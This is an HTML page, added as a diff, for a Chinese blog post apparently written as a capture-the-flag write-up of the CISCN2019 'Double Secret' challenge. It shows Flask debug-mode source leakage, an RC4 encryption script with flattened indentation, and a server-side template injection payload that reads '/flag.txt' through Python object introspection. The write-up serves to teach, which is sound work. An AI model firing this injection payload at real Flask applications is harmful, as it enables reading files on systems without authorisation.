@@ -1,0 +1,350 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习40——flask框架下debug模式 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-08-17">2021-08-17</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习40——flask框架下debug模式</h2>
+            <div class="post-meta">
+                emm... 2558 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p>今天又碰到了之前写过的有关debug模式未关闭而造成的源码泄露的题目，现在记录一下。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/611b4ec94907e2d39c417a25.png"><img src="https://pic.imgdb.cn/item/611b4ec94907e2d39c417a25.png"></a>  </p>
+<p>打开题目看见让我们找秘密。我们可以用目录扫描工具扫描出来一个secret页面。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/611b4f664907e2d39c43a62e.png"><img src="https://pic.imgdb.cn/item/611b4f664907e2d39c43a62e.png"></a>  </p>
+<p>让我们告诉秘密，尝试get方式传参secret。发现确实有回显。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/611b4fb44907e2d39c44bc95.png"><img src="https://pic.imgdb.cn/item/611b4fb44907e2d39c44bc95.png"></a>   </p>
+<p>随便输入测试后发现当我们输入字符超过一定位数时，便会跳转到debug界面。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/611b501a4907e2d39c462cca.png"><img src="https://pic.imgdb.cn/item/611b501a4907e2d39c462cca.png"></a>  </p>
+<p>这个模式我们之前已经说过它的危害了，最直接的就是他会将部分源码泄露，这样我们就能找到可趁之机来绕过一些过滤，从而拿到flag。  </p>
+<p>泄露的部分源码如下：  </p>
+<pre><code>if(secret==None):
+
+    return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
+
+rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密
+
+deS=rc.do_crypt(secret)
+
+
+
+a=render_template_string(safe(deS))
+
+
+
+if &#39;ciscn&#39; in a.lower():
+
+    return &#39;flag detected!&#39;
+
+[Open an interactive python shell in this frame]     return a  </code></pre>
+<p>我们已经知道这道题目时flask下的ssti注入题目，同时源码中也告诉我们我们我们输入的字符传入后是会被rc4算法解密，同时给出了密钥<strong>HereIsTreasure</strong>，我们可以不用专门了解这个算法，直接在网上找到rc4加密脚本，使用给出的密钥加密我们构造的ssti的payload即可。这样我们传入的payload被解密后就能成功ssti注入。   </p>
+<p>下面附上脚本   </p>
+<pre><code>import base64
+from urllib.parse import quote
+def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):
+# print(&quot;RC4加密主函数&quot;)
+s_box = rc4_init_sbox(key)
+crypt = str(rc4_excrypt(message, s_box))
+return  crypt
+def rc4_init_sbox(key):
+s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
+# print(&quot;原来的 s 盒：%s&quot; % s_box)
+j = 0
+for i in range(256):
+    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+    s_box[i], s_box[j] = s_box[j], s_box[i]
+# print(&quot;混乱后的 s 盒：%s&quot;% s_box)
+return s_box
+def rc4_excrypt(plain, box):
+# print(&quot;调用加密程序成功。&quot;)
+res = []
+i = j = 0
+for s in plain:
+    i = (i + 1) % 256
+    j = (j + box[i]) % 256
+    box[i], box[j] = box[j], box[i]
+    t = (box[i] + box[j]) % 256
+    k = box[t]
+    res.append(chr(ord(s) ^ k))
+# print(&quot;res用于加密字符串，加密后是：%res&quot; %res)
+cipher = &quot;&quot;.join(res)
+print(&quot;加密后的字符串是：%s&quot; %quote(cipher))
+#print(&quot;加密后的输出(经过编码):&quot;)
+#print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
+return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
+rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;&quot;)  </code></pre>
+<p>得到payload：  </p>
+<pre><code>.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/611b522f4907e2d39c4e3dee.png"><img src="https://pic.imgdb.cn/item/611b522f4907e2d39c4e3dee.png"></a>  </p>
+<p>访问得到flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的还是ssti注入和debug模式的认识以及对其利用。注入比较简单，只不过中间多了一个rc4的加密，这个可以使用脚本完成，并不需要过多深入了解，总体较为简单。  </p>
+<p>关于debug模式开启的危害博客：  </p>
+<p><a href="https://george186.github.io/test77/undefined-undefined.html">debug模式的危害</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
